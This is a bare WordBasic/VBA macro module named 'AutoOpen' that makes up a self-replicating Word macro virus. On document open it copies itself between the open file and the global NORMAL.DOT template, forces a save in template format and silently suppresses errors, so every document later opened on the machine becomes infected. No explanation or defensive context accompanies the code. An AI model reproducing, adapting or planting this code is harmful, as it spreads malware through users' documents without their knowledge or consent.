   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim F$
   Dim G$
   Dim M$
   On Error GoTo -1: On Error GoTo MinSize
   F$ = WordBasic.[FileName$]() + ":AutoOpen"
   G$ = "Global:AutoOpen"
   M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If M$ = "NORMAL.DOT" Then
   WordBasic.MacroCopy G$, F$
   WordBasic.FileSaveAs Format:=1
   Else
   WordBasic.MacroCopy F$, G$
   End If
   MinSize:
   End Sub
